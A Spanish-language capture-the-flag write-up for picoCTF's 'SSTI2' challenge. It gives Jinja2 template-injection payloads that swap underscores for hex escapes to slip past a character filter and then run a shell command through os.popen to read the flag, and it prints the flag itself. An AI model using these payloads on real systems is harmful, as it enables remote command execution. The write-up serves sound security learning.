## SSTI2

### Descripción
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
### Solución

#### Solución 1
Todos los payloads tradicionales fallaron, debido a que los filtros estaban atrapando tanto los patrones de entrada como el contenido de salida, haciendo imposible la explotación estándar.
Investigando se encontraron los siguientes payloads:
```
{{config|attr('\x5f\x5fclass\x5f\x5f')}}
```
```
{{config|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')}}
```
```
{{ config | attr('\x5f\x5fclass\x5f\x5f') | attr('\x5f\x5finit\x5f\x5f') | attr('\x5f\x5fglobals\x5f\x5f') | attr('\x5f\x5fgetitem\x5f\x5f')('os') | attr('popen')('cat flag') | attr('read')() }}
```
La codificación hexadecimal \x5f representa el carácter de guión bajo (_), haciendo que `\x5f\x5fclass\x5f\x5f` sea equivalente a `__class__` pero invisible para los filtros basados en cadenas.

picoCTF{sst1_f1lt3r_byp4ss_63b833cd}
### Notas adicionales


### Referencias

-